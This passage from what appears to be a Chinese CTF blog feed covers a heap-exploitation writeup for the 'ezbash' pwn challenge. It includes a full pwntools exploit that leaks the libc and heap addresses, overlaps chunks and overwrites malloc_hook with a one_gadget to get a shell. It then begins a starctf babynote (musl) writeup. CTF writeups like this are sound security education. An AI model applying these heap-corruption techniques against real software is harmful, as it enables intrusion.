class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( src-&gt;context || !des-&gt;context )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( src-&gt;context &amp;&amp; des-&gt;context )       <span class=\"comment\">// 文件复制到文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v4 = <span class=\"built_in\">strlen</span>(src-&gt;context);</span><br><span class=\"line\">        v5 = <span class=\"built_in\">strlen</span>(des-&gt;context);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v4 &gt; v5 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          dest = <span class=\"built_in\">realloc</span>(des-&gt;context, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(dest-&gt;context, <span class=\"number\">0</span>, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(des-&gt;context, <span class=\"number\">0</span>, v5);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result = <span class=\"built_in\">strncpy</span>(dest-&gt;context, src-&gt;context, v4);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span>                                      <span class=\"comment\">// 没有context</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        result = src-&gt;context;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          result = des-&gt;context;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !result )</span><br><span class=\"line\">            result = copycontext(src, des);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>echo 是检查 chunksize, 这里用 strlen，我们 echo 以及 cp 都不会在末尾强行补一个空字符，如果我们申请的 0x28，那么我们就可以填满 chunk 的用户空间，而且数据会与下一个堆块的 chunksize 来年再一个，只要 v4=v5, 就可以修改 chunksize，把后面的 chunk 包含进去。</p>\n<p>我们把文件部署在 actim 后面，0x51 就是我们的文件，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x1</span>,<span class=\"string\">b&#x27;6&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;mmmm&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x01884&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#change the chunksize wo achieve overlap</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;1&#x27;</span>,<span class=\"string\">b&#x27;\\x51\\x04&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir2&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p64(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pad = p64(malloc_hook)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">5</span>:<span class=\"number\">7</span>])</span><br><span class=\"line\">malloc(<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dir2&#x27;</span>,pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">pad = p64(onegadget)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x23</span>)+pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>],<span class=\"string\">b&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425154952331.png\" alt=\"image-20220425154952331\"></p>\n<p>修改后</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155032483.png\" alt=\"image-20220425155032483\"></p>\n<p>你只能写入一个地址，context 在 chunk 的第四个 8 字节位置，我们要向改掉，申请堆块就要拿到 chunk+0x10 的 chunk</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155752574.png\" alt=\"image-20220425155752574\"></p>\n<p>这里就是我们的 5 那个文件。我们目标是申请到她 + 0x10 的 chunk</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425160145339.png\" alt=\"image-20220425160145339\"></p>\n<p>同时我们已经将 malloc_hook-0x23 的地址写到了对应的 context 指针位置，我们下 main 只需要对他进行编辑</p>\n<p>这里为甚不直接使用 malloc_hook.cp 里面 strlen 返回的是 0，会进行 realloc，但是不是个合法的 fakechunk，realloc 会报错，echo 也要 chunk 的头部信息，所以布置在 malloc_hook-0x23，这个天然的 fakechunk, 最后 echo 进去，或者 cp 也行</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<p>赛后我们并没有对 exp 进行重新的整理，比较凌乱</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./ezbash&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#r=remote(&#x27;140.82.17.215&#x27;,20642)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./ezbash&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">hacker = <span class=\"string\">&quot;/$ &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">\tr.sendlineafter(hacker,cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ls</span>(<span class=\"params\">ptr</span>):</span><br><span class=\"line\">\tcmd = <span class=\"string\">b&quot;ls &quot;</span>+ptr</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">\tch(cmd = <span class=\"string\">b&quot;cat &quot;</span>+file)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cd</span>(<span class=\"params\">addr</span>):</span><br><span class=\"line\">\tch(<span class=\"string\">b&quot;cd &quot;</span>+addr)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">help</span>():</span><br><span class=\"line\">\tch(<span class=\"string\">&quot;help&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">echo</span>(<span class=\"params\">text,filename</span>):</span><br><span class=\"line\">\tcmd = <span class=\"string\">b&quot;echo &quot;</span> + text +<span class=\"string\">b&quot; -&gt; &quot;</span>+filename</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">touch</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">\tch(<span class=\"string\">b&quot;touch &quot;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rmv</span>(<span class=\"params\">flag,filename</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> flag==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tcmd = <span class=\"string\">b&quot;rm -r &quot;</span>+filename</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> :</span><br><span class=\"line\">\t\tcmd = <span class=\"string\">b&quot;rm &quot;</span>+filename</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mkdir</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">\tch(<span class=\"string\">b&quot;mkdir &quot;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwd</span>():</span><br><span class=\"line\">\tch(<span class=\"string\">&quot;pwd&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cp</span>(<span class=\"params\">a,b</span>):</span><br><span class=\"line\">\tcmd = <span class=\"string\">b&quot;cp &quot;</span>+a+<span class=\"string\">b&quot; &quot;</span>+b</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc</span>(<span class=\"params\">size,ptr,tail=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span>):</span><br><span class=\"line\">\tpad = <span class=\"string\">b&#x27;a&#x27;</span>*size + tail</span><br><span class=\"line\">\techo(pad,<span class=\"string\">b&#x27;cccc&#x27;</span>)</span><br><span class=\"line\">\tcp(<span class=\"string\">b&#x27;cccc&#x27;</span>,ptr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc1</span>(<span class=\"params\">size,ptr,tail=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span>):</span><br><span class=\"line\">\tpad = <span class=\"string\">b&#x27;a&#x27;</span>*size + tail</span><br><span class=\"line\">\techo(pad,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">\tcp(<span class=\"string\">b&#x27;a&#x27;</span>,ptr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">ptr</span>):</span><br><span class=\"line\">\tcp(<span class=\"string\">b&#x27;free&#x27;</span>,ptr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>():</span><br><span class=\"line\">\tgdb.attach(r)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mkdir(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;cccc&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3f2</span>,<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;../&quot;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x3f0</span>,<span class=\"string\">b&quot;cccc&quot;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase  = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3ebca0</span> +<span class=\"number\">0x1ff0c0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">malloc_hook = libcbase + <span class=\"number\">0x1ecb70</span>-<span class=\"number\">0x23</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak the chunk addr</span></span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;\\x70&#x27;</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x001470</span></span><br><span class=\"line\">fake = heap_addr+<span class=\"number\">0x2800</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap_addr : &quot;</span>,<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"><span class=\"comment\">#onegadget = 0xcafebabedeadbeef</span></span><br><span class=\"line\">onegadget = <span class=\"number\">0xe3b31</span>+libcbase</span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">touch(<span class=\"string\">b&quot;free&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;actim&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;null&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x2a0</span>,<span class=\"string\">b&#x27;nop&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;1111&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x110</span>,<span class=\"string\">b&#x27;2222&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#clean the chunk</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x1</span>,<span class=\"string\">b&#x27;6&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;mmmm&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x01884&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#change the chunksize wo achieve overlap</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;1&#x27;</span>,<span class=\"string\">b&#x27;\\x51\\x04&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir2&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p64(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pad = p64(malloc_hook)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">5</span>:<span class=\"number\">7</span>])</span><br><span class=\"line\">malloc(<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dir2&#x27;</span>,pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">pad = p64(onegadget)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x23</span>)+pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>],<span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;7&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>题目文件在链接里</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/19/starctf-babynote/",
            "url": "http://example.com/2022/04/19/starctf-babynote/",
            "title": "starctf_babynote",
            "date_published": "2022-04-19T11:37:17.000Z",
            "content_html": "<h1 id=\"starctfbabynote-musl122\"><a class=\"markdownIt-Anchor\" href=\"#starctfbabynote-musl122\">#</a> starctf\tbabynote musl1.2.2</h1>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop<span class=\"comment\">/*ctf/babbynote/attachment$ file babynote </span></span><br><span class=\"line\"><span class=\"comment\">babynote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped</span></span><br><span class=\"line\"><span class=\"comment\">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ checksec --file=babynote</span></span><br><span class=\"line\"><span class=\"comment\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span></span><br><span class=\"line\"><span class=\"comment\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols\t  No\t0\t\t2\t\tbabynote</span></span><br><span class=\"line\"><span class=\"comment\">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ ./libc.so </span></span><br><span class=\"line\"><span class=\"comment\">musl libc (x86_64)</span></span><br><span class=\"line\"><span class=\"comment\">Version 1.2.2</span></span><br><span class=\"line\"><span class=\"comment\">Dynamic Program Loader</span></span><br><span class=\"line\"><span class=\"comment\">Usage: ./libc.so [options] [--] pathname [args]</span></span><br><span class=\"line\"><span class=\"comment\">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ </span></span><br></pre></td></tr></table></figure>\n<p>第一次做 musl 的题目，有点迷茫。一边查资料一边摸着做。比赛的时候没有任何的突破。</p>\n<h2 id=\"探索的过程\"><a class=\"markdownIt-Anchor\" href=\"#探索的过程\">#</a> 探索的过程</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop<span class=\"comment\">/*ctf/babbynote/attachment$ ./libc.so babynote </span></span><br><span class=\"line\"><span class=\"comment\">                                                   </span></span><br><span class=\"line\"><span class=\"comment\">    _/  _/  _/        _/_/_/  _/_/_/_/_/  _/_/_/_/ </span></span><br><span class=\"line\"><span class=\"comment\">     _/_/_/        _/            _/      _/        </span></span><br><span class=\"line\"><span class=\"comment\">  _/_/_/_/_/      _/            _/      _/_/_/     </span></span><br><span class=\"line\"><span class=\"comment\">   _/_/_/        _/            _/      _/          </span></span><br><span class=\"line\"><span class=\"comment\">_/  _/  _/        _/_/_/      _/      _/           </span></span><br><span class=\"line\"><span class=\"comment\">                                                   </span></span><br><span class=\"line\"><span class=\"comment\">                                                   </span></span><br><span class=\"line\"><span 